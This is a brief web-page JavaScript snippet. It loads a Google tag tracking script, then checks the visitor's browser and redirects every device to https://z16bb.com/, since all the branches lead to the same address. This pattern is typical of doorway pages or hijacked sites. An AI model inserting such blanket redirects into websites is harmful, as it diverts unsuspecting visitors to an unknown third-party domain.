var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://www.googletagmanager.com/gtag/js?id=G-Y03MMZP3TN";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();

	  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-Y03MMZP3TN');



var browser = {
	versions: function () {
		var u = navigator.userAgent,
			app = navigator.appVersion;
		return {
			android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
			iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
			iPad: u.indexOf('iPad') > -1,
		};
	} ()
};
if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
	window.location.href = "https://z16bb.com/";
	}else if (browser.versions.android) {
	window.location.href = "https://z16bb.com/";
}else{
	window.location.href = "https://z16bb.com/";
}
